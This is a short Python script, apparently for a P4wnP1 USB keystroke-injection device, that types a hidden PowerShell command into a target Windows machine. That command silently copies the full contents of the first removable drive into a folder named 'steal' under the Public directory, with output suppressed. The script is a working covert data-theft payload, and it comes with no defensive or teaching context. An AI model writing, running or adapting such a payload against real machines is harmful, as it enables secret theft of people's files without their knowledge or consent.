#!/usr/bin/env python3
import subprocess, shlex

# Robust PS: detect first removable drive, exfil to Public\steal
PS = r'''
$dst="$env:PUBLIC\steal"; if(!(Test-Path $dst)){New-Item -ItemType Directory -Path $dst|Out-Null}
$drv=Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Select-Object -First 1
if($drv){ robocopy ($drv.DeviceID+"\") $dst /E /NFL /NDL /NJH /NJS /nc /ns /np }
'''

def main():
    cmd = "powershell -w hidden -nop -c " + '"' + PS.replace('"','\\"').replace("\n"," ") + '"'
    subprocess.run(["python3","/opt/p4wnp1/tools/inject_hid.py", cmd + "\n"], check=True)

if __name__ == "__main__":
    main()

